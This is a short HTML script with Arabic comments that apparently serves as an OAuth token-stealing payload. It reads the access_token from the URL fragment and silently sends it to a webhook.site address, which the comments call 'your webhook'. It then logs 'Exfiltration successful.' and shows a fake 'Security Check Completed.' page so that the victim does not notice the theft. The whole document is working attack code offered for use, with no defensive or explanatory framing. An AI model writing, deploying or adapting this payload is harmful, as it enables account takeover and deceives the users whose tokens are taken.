<script>
    // 1. التقاط الـ Fragment الذي يحتوي على التوكن من الرابط
    const urlHash = window.location.hash;

    if (urlHash) {
        // 2. استخراج التوكن برمجياً
        const params = new URLSearchParams(urlHash.substring(1));
        const accessToken = params.get('access_token');

        if (accessToken) {
            // 3. إرسال التوكن فوراً وبشكل صامت إلى رابط الـ Webhook الخاص بك
            fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_token=' + accessToken, {
                method: 'GET',
                mode: 'no-cors'
            });

            // 4. توجيه المستخدم لصفحة وهمية أو إظهار رسالة نجاح لتمويه العملية
            console.log("Exfiltration successful.");
            document.body.innerHTML = "<h1>Security Check Completed.</h1>";
        }
    }
</script>
